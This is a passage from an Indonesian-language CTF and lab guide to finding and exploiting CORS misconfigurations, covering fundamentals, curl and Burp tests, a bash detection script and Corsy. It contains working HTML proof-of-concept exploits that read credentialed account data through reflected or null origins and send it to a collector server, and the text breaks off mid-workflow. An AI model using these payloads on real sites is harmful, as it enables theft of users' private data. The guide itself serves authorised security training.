---
id: "33"
title: "33 — CORS Workflow 🌐"
category: "3. Web Exploitation"
categoryId: "web"
filename: "33_cors_workflow.md"
refs_out: ["20","27","28","29","30","32","34"]
refs_in: ["29","30","32","34"]
---

# 33 — CORS Workflow 🌐

← [File 32: Deserialization](/docs/deserialization)  
→ [File 34: OAuth & SSO](/docs/oauth-sso)

> **Scope:** CTF, PortSwigger Web Security Academy, HTB/Root-Me lab, dan aplikasi yang memang Anda punya izin untuk uji.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Goal:** membangun muscle memory untuk menemukan, memvalidasi, dan mengeksploitasi CORS misconfiguration secara metodis.
> 
> ⚠️ **WARNING:** CORS testing yang melibatkan credentials, session cookie, API key, atau exfiltration hanya dilakukan pada lab/target yang diizinkan. Jangan menguji origin arbitrary atau mencoba membaca data user pada production tanpa otorisasi.

---

# 🧠 BAGIAN 0 — FUNDAMENTALS

## 0.1 Apa Itu CORS

### 🔒 Same-Origin Policy (SOP)

Sebelum memahami CORS, pahami dulu **Same-Origin Policy**.

Browser mendefinisikan sebuah origin berdasarkan:

```text
scheme + host + port
```

Contoh:

```text
https://app.example.com:443
```

Origin tersebut:

```text
Scheme = https
Host   = app.example.com
Port   = 443
```

Bandingkan:

|URL|Sama Origin?|Alasan|
|---|---|---|
|`https://example.com/a`|✅|scheme + host + port sama|
|`https://example.com/b`|✅|path berbeda tidak mengubah origin|
|`http://example.com`|❌|scheme berbeda|
|`https://api.example.com`|❌|host berbeda|
|`https://example.com:8443`|❌|port berbeda|
|`https://evil.com`|❌|host berbeda|

---

### 🛡️ Kenapa SOP Ada?

Bayangkan Anda login ke:

```text
https://bank.example
```

Kemudian membuka:

```text
https://evil.example
```

Tanpa SOP, JavaScript dari `evil.example` bisa mencoba:

```text
GET /account
```

ke bank memakai session browser Anda dan membaca hasilnya.

SOP mencegah JavaScript dari origin yang berbeda membaca response secara bebas.

Konsep sederhananya:

```text
Bank
  ↑
  │ private data
  │
Browser
  │
  └── JavaScript dari evil.com
          ❌ tidak boleh membaca response bank
```

---

## 🌉 CORS sebagai Pengecualian SOP

**CORS — Cross-Origin Resource Sharing** adalah mekanisme yang memungkinkan server memberi tahu browser:

> “Saya mengizinkan JavaScript dari origin tertentu membaca response saya.”

Contoh:

```http
Access-Control-Allow-Origin: https://frontend.example
```

Artinya server memberitahu browser:

```text
frontend.example
      ↓
boleh membaca response
```

Jadi CORS bukan pengganti SOP.

CORS adalah mekanisme **untuk mengatur pengecualian terhadap SOP**.

---

## 🧳 Analogi Sederhana

Bayangkan:

```text
SOP = satpam gedung
```

Normal:

```text
Orang luar
   ↓
Mau masuk ruangan
   ↓
SATPAM
   ↓
❌ Ditolak
```

CORS:

```text
Orang luar
   ↓
"Server sudah memberi izin"
   ↓
SATPAM melihat daftar izin
   ↓
✅ Boleh
```

Masalah keamanan:

```text
Server salah membuat daftar izin
      ↓
evil.com ternyata diizinkan
      ↓
Browser memperbolehkan JavaScript
      ↓
Data sensitif dapat terbaca
```

---

## 🗺️ Diagram Dasar CORS

```text
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │
       │ Request
       │ Origin: https://evil.example
       ▼
┌─────────────┐
│   Server    │
└──────┬──────┘
       │
       │ Response
       │ Access-Control-Allow-Origin: ...
       ▼
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │
       │ CORS policy check
       ▼
   ┌───┴────┐
   │        │
 Allow     Block
   │        │
   ▼        ▼
JS dapat   JS tidak
baca       dapat baca
response   response
```

---

# 🆚 Simple Request vs Preflight Request

## ✅ Simple Request

Browser dapat mengirim request cross-origin tanpa preflight apabila memenuhi kondisi CORS "simple request", termasuk metode tertentu dan pembatasan header/content type.

Contoh:

```http
GET /api/profile HTTP/1.1
Host: api.example.test
Origin: https://app.example.test
```

Server:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://app.example.test

{"name":"alice"}
```

Browser membaca:

```text
Origin request
        +
ACA-Origin response cocok
        ↓
✅ JavaScript boleh membaca response
```

---

## ✈️ Preflight Request

Jika request tidak termasuk simple request, browser dapat mengirim:

```text
OPTIONS
```

terlebih dahulu.

Contoh:

```http
OPTIONS /api/profile HTTP/1.1
Host: api.example.test
Origin: https://app.example.test
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type
```

Server:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.test
Access-Control-Allow-Methods: DELETE, GET, POST
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 600
```

Jika preflight gagal:

```text
Browser
   ↓
OPTIONS
   ↓
❌ policy tidak cocok
   ↓
actual request tidak dilakukan
```

---

# 🧾 Header CORS Penting

|Header|Fungsi|
|---|---|
|`Access-Control-Allow-Origin`|Origin mana yang boleh membaca response|
|`Access-Control-Allow-Credentials`|Mengizinkan credentialed cross-origin request|
|`Access-Control-Allow-Methods`|Method yang diizinkan setelah preflight|
|`Access-Control-Allow-Headers`|Request header yang diizinkan|
|`Access-Control-Expose-Headers`|Response headers yang boleh dibaca JavaScript|
|`Access-Control-Max-Age`|Cache hasil preflight|

---

## `Access-Control-Allow-Origin`

Contoh:

```http
Access-Control-Allow-Origin: https://app.example.test
```

Atau:

```http
Access-Control-Allow-Origin: *
```

---

## `Access-Control-Allow-Credentials`

Contoh:

```http
Access-Control-Allow-Credentials: true
```

Ini penting ketika request menggunakan credentials seperti:

```text
cookies
HTTP authentication
TLS client credentials tertentu
```

---

## `Access-Control-Allow-Methods`

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
```

---

## `Access-Control-Allow-Headers`

```http
Access-Control-Allow-Headers: Authorization, Content-Type, X-API-Key
```

---

## `Access-Control-Expose-Headers`

Secara default JavaScript tidak dapat membaca semua response header.

Contoh:

```http
Access-Control-Expose-Headers: X-Internal-ID, X-RateLimit-Remaining
```

---

## `Access-Control-Max-Age`

Contoh:

```http
Access-Control-Max-Age: 600
```

Browser dapat cache keputusan preflight untuk periode tertentu sesuai aturan browser.

---

# 🚨 Kapan CORS Menjadi Berbahaya?

Jangan menggunakan rule:

```text
CORS header ada
       ↓
vulnerable
```

Rule yang benar:

```text
Attacker-controlled Origin
        ↓
Server mengizinkan?
        ↓
Credentials?
        ↓
Sensitive endpoint?
        ↓
Browser dapat membaca response?
        ↓
Impact?
```

CORS sangat berbahaya apabila:

```text
Untrusted origin
+
Credentialed request
+
Sensitive response
+
Server mempercayai origin
```

---

# 🔍 0.2 Anatomy CORS Request

## Simple Request

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: https://evil.example
Cookie: session=LAB_SESSION

Accept: application/json
```

Response vulnerable:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true

{"username":"alice","email":"alice@example.test","role":"admin"}
```

Interpretasi:

```text
Attacker origin
       ↓
reflected
       ↓
credentials allowed
       ↓
sensitive response
       ↓
🔥 high-value CORS issue
```

---

# ✈️ Preflight Example

Request:

```http
OPTIONS /api/account HTTP/1.1
Host: api.example.test
Origin: https://evil.example
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization
```

Response:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Authorization
```

Actual request:

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: https://evil.example
Authorization: Bearer LAB_TOKEN
```

---

# 👀 Membaca Response di Burp

Di Burp:

```text
Proxy
  ↓
HTTP history
  ↓
Pilih request
  ↓
Request tab
  ↓
Tambahkan Origin
  ↓
Send / Repeater
  ↓
Lihat Response headers
```

Cari:

```text
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
Access-Control-Expose-Headers
```

---

# 🧠 0.3 Cara Browser Enforce CORS

Browser secara konseptual melakukan:

```text
Cross-origin request
      ↓
Apakah response memiliki policy yang sesuai?
      ↓
Origin cocok?
      ↓
Credentials mode cocok?
      ↓
Method/header policy cocok?
      ↓
Expose header policy?
      ↓
Allow / Block JS access
```

Hal yang sangat penting:

```text
Server tetap menerima HTTP request
```

CORS terutama menentukan:

```text
apakah JavaScript dapat membaca response
```

Bukan:

```text
apakah server menerima request TCP/HTTP
```

---

# ⚠️ CORS BUKAN SERVER-SIDE AUTHORIZATION

Ini salah satu miskonsepsi terbesar pemula.

Misalnya:

```http
GET /api/admin HTTP/1.1
Host: api.example.test
Origin: https://evil.example
Cookie: session=LAB_SESSION
```

Server dapat tetap menjawab:

```http
HTTP/1.1 200 OK
```

walaupun CORS salah.

Browser kemudian mungkin berkata:

```text
Response ada
      ↓
CORS policy gagal
      ↓
JavaScript tidak boleh membaca body
```

Jadi:

```text
CORS
≠ authentication
≠ authorization
≠ CSRF protection
≠ server-side access control
```

CORS terutama adalah **browser-enforced read policy**.

---

# 🧨 BAGIAN 1 — CORS MISCONFIGURATION TYPES

# 1.1 Wildcard Origin `*` ⭐

## Apa Itu?

Response:

```http
Access-Control-Allow-Origin: *
```

Artinya server mengizinkan cross-origin reading untuk resource tersebut tanpa membatasi ke satu origin.

---

## ⚖️ Kapan `*` Tidak Berbahaya?

Misalnya resource benar-benar public:

```http
GET /public/logo.png
```

Maka:

```http
Access-Control-Allow-Origin: *
```

umumnya tidak sensitif.

Begitu juga API yang hanya mengembalikan:

```json
{"status":"ok"}
```

tanpa credential atau data private.

---

## 🚨 Kapan `*` Berbahaya?

Masalah muncul ketika developer menganggap:

```text
*
+
credentials
```

berarti:

```text
semua origin boleh membaca data user
```

Padahal browser tidak bekerja seperti itu.

---

## ❗ Kenapa `*` + Credentials Tidak Bekerja?

Misalnya server mengirim:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browser tidak menerima wildcard sebagai origin yang valid untuk credentialed read.

Jadi:

```text
Request cross-origin
       +
credentials
       +
ACA-Origin: *
       ↓
❌ Browser block JS access
```

Contoh:

```text
https://evil.example
       ↓
fetch(..., {credentials:"include"})
       ↓
Response:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
       ↓
❌ response tidak dapat dibaca JavaScript
```

### Bandingkan dengan Reflection

Vulnerable reflection:

```http
Origin: https://evil.example
```

Response:

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

Ini berbeda total.

```text
Wildcard:
*
   ↓
credentialed read ❌

Reflection:
https://evil.example
   ↓
credentialed read ✅
```

---

## 🔎 Detect Wildcard

Request:

```http
GET /api/public HTTP/1.1
Host: api.example.test
Origin: https://evil.example
```

Response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

---

## 🧪 Burp Test

```text
1. Capture request
2. Send to Repeater
3. Add Origin
4. Kirim
5. Check ACAO
6. Tambahkan credential scenario
7. Verify browser behavior
```

---

## 🛠️ curl Test

```bash
# Test wildcard response
curl -i \
  -H 'Origin: https://evil.example' \
  'https://lab.example/api/public'

# Test wildcard + credential header
curl -i \
  -H 'Origin: https://evil.example' \
  -H 'Cookie: session=LAB_SESSION' \
  'https://lab.example/api/account'
```

> `curl` dapat memperlihatkan header yang salah, tetapi `curl` **tidak menegakkan SOP/CORS seperti browser**. Jadi hasil curl bukan bukti bahwa browser dapat membaca response.

---

# 1.2 Null Origin ⚪

## Apa Itu `null` Origin?

Browser dapat mengirim:

```http
Origin: null
```

Contohnya dapat berasal dari beberapa isolated/sandboxed browsing contexts.

Salah satu mekanisme lab adalah:

```html
<iframe sandbox>
```

Origin document dalam sandbox tertentu dapat menjadi opaque origin dan dipresentasikan sebagai `null`.

---

## 🧪 Contoh Sandbox

```html
<!doctype html>
<html>
<body>

<h1>Null Origin CORS Lab</h1>

<iframe
    sandbox="allow-scripts"
    srcdoc="
        <script>
            fetch('https://lab.example/api/account', {
                credentials: 'include'
            })
            .then(r => r.text())
            .then(data => {
                parent.postMessage(data, '*');
            });
        </script>
    ">
</iframe>

<script>
window.addEventListener('message', (event) => {
    console.log('Received:', event.data);
});
</script>

</body>
</html>
```

Request yang mungkin dikirim browser dari sandboxed context:

```http
Origin: null
```

---

## 🚨 Response Vulnerable

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"username":"alice","email":"alice@example.test"}
```

---

## 💥 Kenapa Berbahaya?

Karena beberapa aplikasi menggunakan:

```text
trusted origins = { null, https://trusted.example }
```

atau melakukan:

```text
if Origin == "null":
    allow
```

Padahal `null` bukan "website milik admin".

Itu adalah representasi opaque origin tertentu.

---

## 🧪 Burp Test

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: null
Cookie: session=LAB_SESSION
```

Cari:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ curl Test

```bash
# Test null Origin
curl -i \
  -H 'Origin: null' \
  'https://lab.example/api/account'

# Test null Origin dengan cookie lab
curl -i \
  -H 'Origin: null' \
  -H 'Cookie: session=LAB_SESSION' \
  'https://lab.example/api/account'
```

---

# 1.3 Origin Reflection 🔁

## Konsep

Server mengambil:

```http
Origin: https://evil.example
```

dan langsung mengembalikan:

```http
Access-Control-Allow-Origin: https://evil.example
```

Tanpa validation yang benar.

Ini merupakan pola yang sangat sering ditemukan dalam CTF/lab.

---

## 📨 Request

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: https://evil.example
Cookie: session=LAB_SESSION
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true

{"username":"alice","email":"alice@example.test","role":"admin"}
```

---

## 🔎 Detection

Kirim:

```http
Origin: https://evil.example
```

Kemudian:

```http
Origin: https://random-attacker.example
```

Jika response berubah:

```text
https://evil.example
        ↓
ACAO: https://evil.example

https://random-attacker.example
        ↓
ACAO: https://random-attacker.example
```

maka terdapat indikasi reflection.

---

## 🧪 Burp

Request 1:

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: https://evil.example
```

Request 2:

```http
GET /api/account HTTP/1.1
Host: api.example.test
Origin: https://attacker.example
```

Compare:

```text
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
```

---

## 🛠️ curl

```bash
# Test first origin
curl -i \
  -H 'Origin: https://evil.example' \
  'https://lab.example/api/account'

# Test second origin
curl -i \
  -H 'Origin: https://attacker.example' \
  'https://lab.example/api/account'

# Test credentialed endpoint with lab cookie
curl -i \
  -H 'Origin: https://evil.example' \
  -H 'Cookie: session=LAB_SESSION' \
  'https://lab.example/api/account'
```

---

# 1.4 Trusted Subdomain Abuse 🏠

## Konsep

Misalnya aplikasi percaya:

```text
*.example.com
```

Secara bisnis mungkin maksud developer:

```text
https://app.example.com
https://admin.example.com
```

Tetapi ternyata:

```text
https://evil.example.com
```

juga dianggap trusted.

---

## 🎯 Attack Surface

```text
example.com
├── app.example.com       trusted
├── admin.example.com     trusted
└── evil.example.com      attacker-controlled
```

Jika:

```http
Origin: https://evil.example.com
```

dibalas:

```http
Access-Control-Allow-Origin: https://evil.example.com
Access-Control-Allow-Credentials: true
```

maka subdomain tersebut berpotensi menjadi attack origin.

---

## 💣 CORS + XSS

Misalnya terdapat XSS di:

```text
https://evil.example.com
```

Maka attacker tidak perlu mengendalikan seluruh host.

Flow:

```text
XSS di trusted subdomain
        ↓
JavaScript berjalan pada trusted origin
        ↓
CORS whitelist menerima origin
        ↓
Request credentialed
        ↓
Read sensitive API
```

---

## 🧪 Test

```http
GET /api/account HTTP/1.1
Host: api.example.com
Origin: https://evil.example.com
Cookie: session=LAB_SESSION
```

Response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example.com
Access-Control-Allow-Credentials: true
```

---

## 🛠️ curl

```bash
# Test trusted subdomain
curl -i \
  -H 'Origin: https://evil.example.com' \
  'https://api.example.com/api/account'

# Test dengan cookie lab
curl -i \
  -H 'Origin: https://evil.example.com' \
  -H 'Cookie: session=LAB_SESSION' \
  'https://api.example.com/api/account'
```

---

# 1.5 Regex Bypass 🧩

## Konsep

Developer kadang membuat validation seperti:

```text
contains("example.com")
```

atau equivalent regex yang terlalu lemah.

---

## ❌ Regex Lemah

Contoh:

```text
/example\.com/
```

Dapat mencocokkan:

```text
https://evilexample.com
```

karena substring:

```text
example.com
```

tetap ditemukan.

---

## ❌ Regex Lemah Kedua

```text
/^https?:\/\/.*example\.com/
```

Tanpa batas akhir yang tepat, pattern dapat menerima hostname seperti:

```text
https://evil.example.com
```

atau string yang memiliki:

```text
example.com
```

pada posisi yang tidak seharusnya.

Pattern yang lebih ketat harus memvalidasi host secara struktural, bukan sekadar substring.

---

## 🎯 Test Strategy

Kirim beberapa origin:

```text
https://evil.com
https://example.com.evil.com
https://evilexample.com
https://evil.example.com
https://example.com
```

---

## 🛠️ curl

```bash
# Test exact trusted origin
curl -i \
  -H 'Origin: https://example.com' \
  'https://lab.example/api/account'

# Test suffix bypass candidate
curl -i \
  -H 'Origin: https://example.com.evil.com' \
  'https://lab.example/api/account'

# Test substring bypass candidate
curl -i \
  -H 'Origin: https://evilexample.com' \
  'https://lab.example/api/account'

# Test trusted subdomain candidate
curl -i \
  -H 'Origin: https://evil.example.com' \
  'https://lab.example/api/account'
```

---

# 1.6 Protocol Mismatch 🔄

## Konsep

Origin terdiri dari:

```text
scheme + host + port
```

Jadi:

```text
http://example.com
```

dan:

```text
https://example.com
```

adalah origin berbeda.

Misconfiguration dapat terjadi ketika HTTPS API mempercayai HTTP origin:

```http
Origin: http://trusted.example.com
```

Response:

```http
Access-Control-Allow-Origin: http://trusted.example.com
Access-Control-Allow-Credentials: true
```

---

## 🚨 Kenapa Berbahaya?

HTTP origin lebih lemah dari HTTPS dalam konteks confidentiality/integrity.

Jika attacker bisa menjalankan JavaScript pada HTTP origin trusted:

```text
HTTP trusted origin
       ↓
CORS trusts it
       ↓
credentialed request
       ↓
sensitive data
```

---

## 🧪 Burp Test

```http
GET /api/account HTTP/1.1
Host: api.example.com
Origin: http://trusted.example.com
Cookie: session=LAB_SESSION
```

---

## 🛠️ curl

```bash
# Test HTTP trusted origin
curl -i \
  -H 'Origin: http://trusted.example.com' \
  'https://api.example.com/api/account'

# Test HTTP origin dengan cookie lab
curl -i \
  -H 'Origin: http://trusted.example.com' \
  -H 'Cookie: session=LAB_SESSION' \
  'https://api.example.com/api/account'
```

---

# 🔬 BAGIAN 2 — DETECTION WORKFLOW

# 2.1 Manual Detection di Burp 🕵️

## Step 1 — Cari Sensitive Endpoint

Prioritaskan:

```text
/api/account
/api/profile
/api/me
/api/admin
/api/orders
/api/payment
/api/tokens
/api/keys
/graphql
```

Pertanyaan:

```text
Response berisi apa?
```

---

## Step 2 — Capture Request

```text
Browser
  ↓
Proxy
  ↓
HTTP history
  ↓
Request
```

---

## Step 3 — Send to Repeater

Di Burp:

```text
Right click request
        ↓
Send to Repeater
```

---

## Step 4 — Tambahkan Origin

```http
Origin: https://evil.example
```

---

## Step 5 — Kirim

Perhatikan response.

---

## Step 6 — Cari Header

Cari:

```text
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
```

---

## Step 7 — Interpretasi

### Case A — No CORS

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"username":"alice"}
```

Artinya:

```text
Response ada
tetapi tidak ada CORS permission
```

Browser JavaScript cross-origin biasanya tidak dapat membaca body.

---

### Case B — Wildcard

```http
Access-Control-Allow-Origin: *
```

Interpretasi:

```text
Potentially permissive
```

Tetapi:

```text
belum otomatis exploitable
```

---

### Case C — Reflection tanpa credentials

```http
Access-Control-Allow-Origin: https://evil.example
```

tetapi:

```text
Access-Control-Allow-Credentials
tidak ada
```

Biasanya:

```text
impact credentialed data theft tidak langsung
```

Tetap cek endpoint dan authentication model.

---

### Case D — Reflection + Credentials

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

dan response berisi data private:

```json
{"email":"alice@example.test","role":"admin"}
```

Ini merupakan kandidat kuat.

---

### Case E — Null

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Perlu test dari genuine `null` origin context.

---

### Case F — Origin Ditolak

```http
Origin: https://evil.example
```

response tidak memiliki:

```http
Access-Control-Allow-Origin
```

atau server mengembalikan error.

Interpretasi:

```text
Origin mungkin tidak trusted
```

---

# 2.2 Detection Script dengan curl 🐚

Script berikut menerima URL dan menguji beberapa origin.

```bash
#!/usr/bin/env bash

# Stop on common scripting errors.
set -u

# Require target URL.
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

TARGET="$1"

# Origins to test.
ORIGINS=(
    "https://evil.example"
    "null"
    "https://evil.example.com"
    "https://example.com.evil.example"
    "https://evilexample.com"
    "http://example.com"
)

echo "=== CORS CHECK ==="
echo "Target: $TARGET"
echo

for ORIGIN in "${ORIGINS[@]}"; do
    echo "----------------------------------------"
    echo "Origin: $ORIGIN"

    RESPONSE="$(curl -sS -i \
        -H "Origin: $ORIGIN" \
        "$TARGET")"

    ACAO="$(printf '%s\n' "$RESPONSE" | \
        grep -i '^Access-Control-Allow-Origin:' | \
        tail -n 1 | \
        tr -d '\r')"

    ACAC="$(printf '%s\n' "$RESPONSE" | \
        grep -i '^Access-Control-Allow-Credentials:' | \
        tail -n 1 | \
        tr -d '\r')"

    if [ -n "$ACAO" ]; then
        echo "$ACAO"
    else
        echo "Access-Control-Allow-Origin: <not present>"
    fi

    if [ -n "$ACAC" ]; then
        echo "$ACAC"
    else
        echo "Access-Control-Allow-Credentials: <not present>"
    fi

    # Highlight potentially interesting combinations.
    if printf '%s\n' "$ACAO" | grep -qi "Access-Control-Allow-Origin: $ORIGIN"; then
        if printf '%s\n' "$ACAC" | grep -qi "true"; then
            echo "[!] POTENTIALLY VULNERABLE: reflected origin + credentials"
        else
            echo "[?] Origin appears reflected"
        fi
    elif printf '%s\n' "$ACAO" | grep -qi 'Access-Control-Allow-Origin: \*'; then
        echo "[?] Wildcard origin detected"
    fi

    echo
done
```

Save:

```bash
# Create script
nano cors_check.sh

# Make executable
chmod +x cors_check.sh

# Run against lab endpoint
./cors_check.sh 'https://lab.example/api/account'
```

---

# 🧰 2.3 Automated Tools — Corsy

`Corsy` merupakan tool Python untuk membantu mengotomatisasi pemeriksaan CORS.

Untuk menjaga workflow tetap reproducible, instal di virtual environment.

```bash
# Create a directory for the tool
mkdir -p ~/tools/corsy

# Enter the directory
cd ~/tools/corsy

# Create Python virtual environment
python3 -m venv .venv

# Activate virtual environment
source .venv/bin/activate

# Upgrade pip
python -m pip install --upgrade pip

# Install the Corsy package when available in your configured Python package index
python -m pip install corsy

# Show help
corsy -h
```

> Jika package bernama `corsy` tidak tersedia pada index yang Anda gunakan, gunakan source release resmi yang Anda pilih untuk lab dan install dari source sesuai dokumentasinya. Jangan copy-paste command repository yang tidak diverifikasi ke production system.

Contoh penggunaan:

```bash
# Run Corsy against a lab target
corsy -u 'https://lab.example/api/account'
```

Contoh pola output yang perlu dipahami:

```text
[+] Target: https://lab.example/api/account
[+] Testing Origin: https://evil.example
[+] Access-Control-Allow-Origin: https://evil.example
[+] Access-Control-Allow-Credentials: true
[!] Potentially vulnerable CORS configuration
```

Jangan menganggap output tool sebagai final verdict.

```text
Scanner
   ↓
Finding
   ↓
Manual validation
   ↓
Browser PoC
   ↓
Confirmed impact
```

---

# 💥 BAGIAN 3 — EXPLOITATION WORKFLOW

# 3.1 Prerequisites untuk Exploit

## 🔑 Kenapa Credentials Penting?

Target bernilai tinggi biasanya:

```text
GET /api/account
```

yang memerlukan:

```text
Cookie: session=...
```

Jika attacker's JavaScript mengirim:

```javascript
fetch("https://api.example/api/account", {
    credentials: "include"
})
```

browser mencoba memasukkan credentials yang berlaku sesuai kebijakan cookie/browser.

Agar JavaScript cross-origin dapat membaca response credentialed tersebut, server harus memberikan policy yang compatible, terutama:

```http
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

---

# ✅ Kondisi Exploit yang Kuat

```text
1. Attacker controls/hosts origin
2. Victim is authenticated
3. Sensitive endpoint accessible
4. Request is actually accepted
5. Server returns attacker origin
6. Credentials are allowed when needed
7. Browser allows JS to read response
8. Attacker can transmit data to controlled lab endpoint
```

---

# 🆚 With vs Without Credentials

|Kondisi|Data private berbasis cookie dapat dicuri?|
|---|---|
|`ACAO: *`, no credentials|Tidak otomatis|
|Reflection, no credentials|Hanya berguna untuk resource yang dapat diakses tanpa credential|
|Reflection + credentials|✅ Kandidat serius|
|`null` + credentials|✅ Kandidat serius|
|Trusted subdomain + credentials|✅ Kandidat serius|
|CORS error di browser|❌ JavaScript tidak dapat membaca response|

---

# 🧪 3.2 Proof of Concept HTML

> Semua contoh berikut dimaksudkan untuk **lab**. Ganti `https://lab.example` dengan target lab Anda sendiri dan gunakan endpoint yang memang Anda punya izin untuk uji.

---

# 🅰️ Skenario A — Origin Reflection + Credentials

## Tujuan

Menguji:

```text
evil origin
   ↓
credentialed fetch
   ↓
sensitive response
   ↓
controlled collector
```

---

## PoC Lengkap

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CORS Lab - Reflection + Credentials</title>
</head>
<body>

<h1>CORS Lab</h1>
<pre id="output">Waiting...</pre>

<script>
(async () => {
    const output = document.getElementById("output");

    // Target sensitive endpoint in your authorized lab.
    const target = "https://lab.example/api/account";

    // Collector controlled by you in the lab.
    const collector = "http://127.0.0.1:9001/";

    try {
        const response = await fetch(target, {
            method: "GET",
            credentials: "include"
        });

        const text = await response.text();

        output.textContent = text;

        // Send a URL-encoded copy to your local lab collector.
        const beacon = collector + "?data=" + encodeURIComponent(text);

        // Fire-and-forget request to the controlled collector.
        await fetch(beacon, {
            method: "GET",
            mode: "no-cors"
        });
    } catch (error) {
        output.textContent = "CORS/Fetch error: " + error;
    }
})();
</script>

</body>
</html>
```

---

## Apa yang Terjadi?

```text
Browser victim
      ↓
JavaScript evil origin
      ↓
fetch(lab.example, credentials include)
      ↓
Cookie/session ikut
      ↓
API response
      ↓
Browser CORS validation
      ↓
Allowed?
      ↓
JavaScript membaca response
      ↓
collector menerima copy
```

---

# 🅱️ Skenario B — Null Origin

PoC:

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Null Origin CORS Lab</title>
</head>
<body>

<h1>Null Origin CORS Lab</h1>

<iframe
    id="cors-frame"
    sandbox="allow-scripts"
    srcdoc='
<!doctype html>
<html>
<body>
<script>
(async () => {
    const target = "https://lab.example/api/account";

    try {
        const response = await fetch(target, {
            method: "GET",
            credentials: "include"
        });

        const text = await response.text();

        parent.postMessage({
            ok: true,
            data: text
        }, "*");
    } catch (error) {
        parent.postMessage({
            ok: false,
            error: String(error)
        }, "*");
    }
})();
<\/script>
</body>
</html>
'>
</iframe>

<pre id="output">Waiting...</pre>

<script>
window.addEventListener("message", (event) => {
    const output = document.getElementById("output");

    if (event.data && event.data.ok) {
        output.textContent = event.data.data;
    } else {
        output.textContent = event.data.error || "Unknown error";
    }
});
</script>

</body>
</html>
```

Expected attack-side observation:

```http
Origin: null
```

Jika server:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

dan target response sensitif terbaca di browser:

```text
🔥 CORS null-origin vulnerability confirmed
```

---

# 🅲️ Skenario C — Steal Sensitive Data

Jangan membatasi assessment hanya pada:

```text
"API key"
```

Periksa:

```text
account information
profile information
emails
orders
billing information
CSRF tokens
OAuth tokens
API keys
internal identifiers
admin data
feature flags
```

PoC lab yang menyimpan response:

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>CORS Sensitive Data Lab</title>
</head>
<body>

<h1>Sensitive Data Test</h1>
<pre id="output">Loading...</pre>

<script>
(async () => {
    const output = document.getElementById("output");

    const endpoints = [
        "https://lab.example/api/me",
        "https://lab.example/api/account",
        "https://lab.example/api/profile"
    ];

    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint, {
                credentials: "include"
            });

            const body = await response.text();

            output.textContent +=
                "\n=== " + endpoint + " ===\n" +
                body + "\n";
        } catch (error) {
            output.textContent +=
                "\n=== " + endpoint + " ===\n" +
                "ERROR: " + error + "\n";
        }
    }
})();
</script>

</body>
</html>
```

Untuk lab, gunakan endpoint yang memang memberikan data dummy.

---

# 🛰️ 3.3 Setup Attack Server

## Python HTTP Server

Di Parrot OS:

```bash
# Create directory for CORS PoC
mkdir -p ~/labs/cors/poc

# Enter the directory
cd ~/labs/cors/poc

# Start a local HTTP server
python3 -m http.server 8000
```

Buka dari browser:

```text
http://127.0.0.1:8000/
```

---

# 🧲 Collector Server

Buat collector sederhana:

```bash
# Create collector directory
mkdir -p ~/labs/cors/collector

# Enter collector directory
cd ~/labs/cors/collector

# Start HTTP server on a different port
python3 -m http.server 9001
```

Ketika browser mengirim:

```text
http://127.0.0.1:9001/?data=...
```

terminal akan menampilkan request log.

---

# 🧪 Flow Attack Server

```text
┌───────────────────┐
│ Browser / Victim  │
└─────────┬─────────┘
          │
          │ GET PoC
          ▼
┌───────────────────┐
│  PoC HTTP Server  │
│      :8000        │
└─────────┬─────────┘
          │
          │ fetch()
          ▼
┌───────────────────┐
│  Lab API Server   │
│       :443        │
└─────────┬─────────┘
          │
          │ sensitive response
          ▼
┌───────────────────┐
│ Collector Server  │
│      :9001        │
└───────────────────┘
```

---

# 🧪 3.4 Lab PortSwigger Approach

Workflow:

```text
Open CORS lab
      ↓
Identify target endpoint
      ↓
Login if required
      ↓
Proxy request
      ↓
Send to Repeater
      ↓
Modify Origin
      ↓
Inspect ACAO
      ↓
Inspect ACAC
      ↓
